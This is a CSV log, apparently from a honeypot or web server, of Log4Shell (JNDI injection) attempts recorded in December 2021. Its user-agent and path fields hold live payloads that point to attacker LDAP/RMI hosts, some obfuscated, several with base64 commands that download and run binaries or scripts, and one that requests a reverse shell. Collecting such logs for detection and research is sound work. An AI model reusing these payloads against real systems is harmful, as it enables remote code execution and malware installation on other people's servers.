ip,"last_seen","first_seen",count,"user_agent","req_path"
"143.244.156.104",1639753802000,1639596042000,167,"${jndi:ldap://135.148.143.217:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMTUyLjY3LjYzLjE1MC9weTsgY3VybCAtTyBodHRwOi8vMTUyLjY3LjYzLjE1MC9weTsgY2htb2QgNzc3IHB5OyAuL3B5IHJjZS54ODY=}","/auth/login?from_page=/"
"147.182.202.30",1639753748000,1639726203000,40,"${jndi:ldap://135.148.143.217:1389/GroovyBypass/Command/Base64/d2dldCBodHRwOi8vMTUyLjY3LjYzLjE1MC9weTsgY3VybCAtTyBodHRwOi8vMTUyLjY3LjYzLjE1MC9weTsgY2htb2QgNzc3IHB5OyAuL3B5IHJjZS54ODY=}","/auth/login?from_page=/%3Fx%3D%24%257Bjndi%3Aldap%3A//135.148.143.217%3A1389/GroovyBypass/Command/Base64/d2dldCBodHRwOi8vMTUyLjY3LjYzLjE1MC9weTsgY3VybCAtTyBodHRwOi8vMTUyLjY3LjYzLjE1MC9weTsgY2htb2QgNzc3IHB5OyAuL3B5IHJjZS54ODY%3D%257D"
"197.246.175.231",1639748342000,1639748340000,2,"${jndi:ldap://31.131.16.127:1389/Exploit}","/"
"60.31.180.149",1639744672000,1639744670000,2,"${jndi:ldap://31.131.16.127:1389/Exploit}","/"
"221.199.187.100",1639736664000,1639618969000,6,"${jndi:ldap://31.131.16.127:1389/Exploit}","/"
"137.184.218.211",1639732260000,1639732260000,1,"borchuk/3.1 ${jndi:ldap://159.223.5.30:1389/o=reference,payload=itzbenz.payload.RickRoll}","/"
"34.80.118.173",1639729716000,1639693026000,4,"Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox","/${jndi:ldap://31.131.16.127:1389/Exploit}"
"1.116.59.211",1639711047000,1639215282000,3,"${jndi:ldap://31.131.16.127:1389/Exploit}","/"
"123.60.215.208",1639707193000,1639707191000,2,"Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox","/${jndi:ldap://31.131.16.127:1389/Exploit}"
"46.105.95.220",1639693342000,1639216042000,3,"${jndi:ldap://31.131.16.127:1389/Exploit}","/"
"139.59.70.139",1639679571000,1639624205000,5,"nimaps/1.1 ${jndi:${jndi:ldap://159.223.5.30:1389/a}}","/"
"192.153.76.18",1639665786000,1639199081000,28,"${jndi:ldap://c6tgsbtmrfjth96vfemgcg7iy7af5h4je.interact.sploit.in}","/"
"104.248.144.120",1639653224000,1639499928000,3,"${jndi:ldap://31.131.16.127:1389/Exploit}","/"
"5.157.38.50",1639649366000,1639214936000,3,"${jndi:ldap://31.131.16.127:1389/Exploit}","/"
"210.31.144.181",1639642423000,1639642422000,2,"${jndi:ldap://185.224.139.151:1389/Exploit}","/"
"191.232.38.25",1639612113000,1639226953000,3,"${jndi:ldap://185.224.139.151:1389/Exploit}","/"
"165.227.239.108",1639599539000,1639506617000,14,"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://142.44.203.85:1389/Basic/Command/Base64/Y3VybCAxMzUuMTI1LjIxNy44Ny9qbmRpLnNoIHwgYmFzaA==}","/auth/login?from_page=/%3Fx%3D%2524%257Bjndi%253Aldap%253A%252F%252F142.44.203.85%253A1389%252FBasic%252FCommand%252FBase64%252FY3VybCAxMzUuMTI1LjIxNy44Ny9qbmRpLnNoIHwgYmFzaA%253D%253D%257D"
"185.220.101.151",1639597009000,1639597009000,1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36","/?a=%24%7Bjndi%3Aldap%3A//193.3.19.159%3A53/c%7D"
"108.61.210.108",1639588590000,1639580398000,8,"${jndi:ldap://162.55.90.26/c/911856426/8080/C}","/"
"171.25.193.20",1639588471000,1639588471000,1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36","/?a=%24%7Bjndi%3Aldap%3A//193.3.19.159%3A53/c%7D"
"185.220.101.162",1639581583000,1639581583000,1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36","/?a=%24%7Bjndi%3Aldap%3A//193.3.19.159%3A53/c%7D"
"185.220.100.254",1639522719000,1639522719000,1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36","/?a=%24%7Bjndi%3Aldap%3A//193.3.19.159%3A53/c%7D"
"195.54.160.149",1639519393000,1639370915000,46,"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS44MC4yMDguMzY6ODA4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS44MC4yMDguMzY6ODA4MCl8YmFzaA==}","/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS44MC4yMDguMzY6ODA4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8zNS44MC4yMDguMzY6ODA4MCl8YmFzaA==}"
"157.245.108.125",1639519296000,1639516774000,5,"borchuk/3.1 ${jndi:ldap://167.99.32.139:1389/Basic/ReverseShell/167.99.32.139/9999}","/"
"51.105.55.17",1639497125000,1639488874000,2,"/${jndi:ldap://45.83.193.150:1389/Exploit}","/"
"164.52.53.163",1639491947000,1639491947000,1,"curl/7.58.0","/${jndi:ldap://45.130.229.168:1389/Exploit}"
"87.251.64.10",1639466026000,1639465888000,2,"${jndi:ldap://178.79.157.186:1389/Basic/Command/Base64/KGN1cmwgLXMgYzZzMm00Y2dyZzUxOTUwdjJkaTBjZ2huc3JveXl5eXluLmludGVyYWN0c2guY29tfHx3Z2V0IGM2czJtNGNncmc1MTk1MHYyZGkwY2dobnNyb3l5eXl5bi5pbnRlcmFjdHNoLmNvbSl8YmFzaA==}",undefined
"178.79.157.186",1639461525000,1639461524000,3,"${jndi:ldap://178.79.157.186:1389/Basic/Command/Base64/KGN1cmwgLXMgYzZzMm00Y2dyZzUxOTUwdjJkaTBjZ2huc3JveXl5eXluLmludGVyYWN0c2guY29tfHx3Z2V0IGM2czJtNGNncmc1MTk1MHYyZGkwY2dobnNyb3l5eXl5bi5pbnRlcmFjdHNoLmNvbSl8YmFzaA==}",undefined
"45.146.164.160",1639460879000,1639408478000,4,"${${lower:${lower:jndi}}:ld${lower:ap}://45.146.164.160:1389/t}","/"
"189.188.33.125",1639459462000,1639447015000,11,"${jndi:ldap://185.244.158.212:9080/x}","/"
"185.220.101.152",1639434945000,1639434945000,1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36","/?a=%24%7Bjndi%3Aldap%3A//193.3.19.159%3A53/c%7D"
"159.223.38.35",1639403020000,1639403020000,5,"${jndi:${lower:l}${lower:d}a${lower:p}://world8080.log4j.bin${upper:a}ryedge.io:80/callback}","/"
"68.183.38.233",1639399109000,1639399108000,5,"${jndi:${lower:l}${lower:d}a${lower:p}://world8080.log4j.bin${upper:a}ryedge.io:80/callback}","/images/favicon.ico"
"142.93.151.76",1639398699000,1639398698000,5,"${jndi:${lower:l}${lower:d}a${lower:p}://world8080.log4j.bin${upper:a}ryedge.io:80/callback}","/"
"165.22.100.216",1639398603000,1639398602000,5,"${jndi:${lower:l}${lower:d}a${lower:p}://world8080.log4j.bin${upper:a}ryedge.io:80/callback}","/images/favicon.ico"
"45.83.65.62",1639378113000,1639378113000,1,"${jndi:dns://45.83.64.1/securityscan-https443}","/$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D"
"45.83.65.220",1639374679000,1639374679000,1,"${jndi:dns://45.83.64.1/securityscan-https443}","/$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D"
"137.184.98.145",1639370696000,1639370695000,2,"${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}","/favicon.ico"
"45.83.64.166",1639369311000,1639369311000,1,"${jndi:dns://45.83.64.1/securityscan-https443}","/$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D"
"45.83.64.78",1639367920000,1639367920000,1,"${jndi:dns://45.83.64.1/securityscan-https443}","/$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D"
"185.220.100.245",1639365079000,1639365079000,1,"${jndi:ldap://193.3.19.159:53/c}","/"
"45.83.66.123",1639363797000,1639363797000,1,"${jndi:dns://45.83.64.1/securityscan-https443}","/$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D"
"157.245.129.50",1639361021000,1639361021000,2,"${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}","/favicon.ico"
"45.83.67.217",1639359989000,1639359989000,1,"${jndi:dns://45.83.64.1/securityscan-https443}","/$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D"
"167.172.151.211",1639355188000,1639355188000,2,"${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}","/favicon.ico"
"45.83.67.242",1639351704000,1639351704000,1,"${jndi:dns://45.83.64.1/securityscan-http8080}","/$%7Bjndi:dns://45.83.64.1/securityscan-http8080%7D"
"134.209.82.14",1639351677000,1639351677000,2,"${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}","/favicon.ico"
"45.83.66.132",1639351572000,1639351572000,1,"${jndi:dns://45.83.64.1/securityscan-http8080}","/$%7Bjndi:dns://45.83.64.1/securityscan-http8080%7D"
"45.83.65.58",1639351381000,1639351381000,1,"${jndi:dns://45.83.64.1/securityscan-http8080}","/$%7Bjndi:dns://45.83.64.1/securityscan-http8080%7D"
"45.83.67.44",1639350779000,1639350779000,1,"${jndi:dns://45.83.64.1/securityscan-http8080}","/$%7Bjndi:dns://45.83.64.1/securityscan-http8080%7D"
"45.83.66.70",1639350318000,1639350318000,1,"${jndi:dns://45.83.64.1/securityscan-http8080}","/$%7Bjndi:dns://45.83.64.1/securityscan-http8080%7D"
"45.83.66.69",1639350232000,1639350232000,1,"${jndi:dns://45.83.64.1/securityscan-http8080}","/$%7Bjndi:dns://45.83.64.1/securityscan-http8080%7D"
"45.83.64.185",1639349376000,1639349376000,1,"${jndi:dns://45.83.64.1/securityscan-http8080}","/$%7Bjndi:dns://45.83.64.1/securityscan-http8080%7D"
"45.83.66.68",1639349234000,1639349234000,1,"${jndi:dns://45.83.64.1/securityscan-http8080}","/$%7Bjndi:dns://45.83.64.1/securityscan-http8080%7D"
"45.83.67.179",1639348797000,1639348797000,1,"${jndi:dns://45.83.64.1/securityscan-http8080}","/$%7Bjndi:dns://45.83.64.1/securityscan-http8080%7D"
"42.159.91.12",1639337326000,1639332781000,2,"Mozilla/5.0 zgrab/0.x","/$%7Bjndi:ldap://45.83.193.150:1389/Exploit%7D"
"49.233.62.251",1639336119000,1639336119000,1,"Mozilla/5.0 zgrab/0.x","/$%7Bjndi:ldap://45.83.193.150:1389/Exploit%7D"
"195.201.175.217",1639332369000,1639328251000,5,"Mozilla/5.0 zgrab/0.x","/$%7Bjndi:ldap://45.83.193.150:1389/Exploit%7D"
"139.59.8.39",1639312689000,1639312688000,2,"${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}","/favicon.ico"
"134.209.24.42",1639309007000,1639309007000,2,"${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}","/favicon.ico"
"188.166.86.206",1639305291000,1639305291000,2,"${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}","/"
"178.62.23.146",1639297778000,1639297778000,2,"${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}","/favicon.ico"
"167.99.36.245",1639252865000,1639245972000,4,"Kryptos Logic Telltale","/$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D"
"167.99.44.32",1639252309000,1639244331000,4,"Kryptos Logic Telltale","/$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D"
"139.59.163.74",1639250345000,1639243507000,4,"Kryptos Logic Telltale","/$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D"
"116.89.189.30",1639250275000,1639250275000,1,"curl/7.58.0","/${jndi:ldap://45.130.229.168:1389/Exploit}"
"147.182.216.21",1639250023000,1639244163000,2,"Kryptos Logic Telltale","/$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D"
"138.197.9.239",1639249892000,1639244032000,2,"Kryptos Logic Telltale","/$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D"
"68.183.207.73",1639249856000,1639243987000,2,"Kryptos Logic Telltale","/$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D"
"188.166.45.93",1639249183000,1639243318000,2,"Kryptos Logic Telltale","/$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D"
"170.210.45.163",1639232536000,1639232536000,1,"curl/7.58.0","/${jndi:ldap://45.130.229.168:1389/Exploit}"
"167.71.13.196",1639215036000,1639206608000,2,"${jndi:ldaps://db65824b.probe001.log4j.leakix.net:9200/b}","/$%7Bjndi:ldaps://db65824b.probe001.log4j.leakix.net:9200/b%7D?${jndi:ldaps://db65824b.probe001.log4j.leakix.net:9200/b}=${jndi:ldaps://db65824b.probe001.log4j.leakix.net:9200/b}"
"185.113.128.30",1639187266000,1639187266000,1,"${jndi:ldap://b43fbc9fd433.bingsearchlib.com:39356/a}","/"
"45.155.205.233",1639164126000,1639156997000,43,"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zNS44Ny4xODMuMjAzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC8zNS44Ny4xODMuMjAzOjQ0Myl8YmFzaA==}","/"
"147.182.150.124",1639161323000,1639161322000,3,"${jndi:rmi://134.209.163.248:80/Z}","/favicon.ico"
"137.184.96.216",1639159256000,1639159256000,3,"${jndi:ldap://134.209.163.248:389/callback/responder}","/favicon.ico"
"171.25.193.77",1639156404000,1639156404000,1,"${jndi:ldap://f441a2f47a34.bingsearchlib.com:39356/a}","/"
"159.65.58.66",1639153861000,1639153861000,3,"${jndi:ldap://134.209.163.248:80/callback/ldap2}","/favicon.ico"
"188.166.122.43",1639151113000,1639151113000,2,"${jndi:http://134.209.163.248/callback/https-port-443-and-http-callback-scheme}","/favicon.ico"